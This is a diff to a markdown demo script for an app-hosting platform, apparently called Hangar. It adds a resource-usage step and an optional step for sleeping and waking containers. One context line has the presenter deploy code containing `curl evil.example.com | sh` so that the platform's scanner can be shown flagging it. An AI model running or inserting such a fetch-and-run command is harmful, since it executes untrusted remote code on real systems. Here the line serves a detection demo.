@@ -110,8 +110,29 @@ because building installs dependencies, and that runs their code.
 Deploy something with `os.system("curl evil.example.com | sh")` in it and show
 it flagged, with the file and line.
 
+Then the **Usage** tab: CPU and memory against the app's own caps, sampled
+every 15 seconds. "It can't take the box down, and I can see it not doing so."
+
 Also worth 10 seconds: the **notes** app writes to a database. Restart it from
 the dashboard; the data is still there.
+
+### 6. It gets out of its own way (30 seconds — optional)
+
+Only if the stack has `HANGAR_IDLE_TIMEOUT` set.
+
+App page → **Sleep**. The container stops; the status chip says `sleeping`.
+Prove it really stopped:
+
+```powershell
+wsl -d Ubuntu-24.04 -u root -- docker inspect hangar-<app-id> --format '{{.State.Status}}'
+# exited
+```
+
+Now open the app's URL. It comes back — about two seconds for a Python app,
+one for Node — and the link never changed.
+
+"Ten tools a team barely uses don't need to hold memory all day. They come back
+when someone opens them. That's how a free VM hosts more than three apps."
 
 ---
 
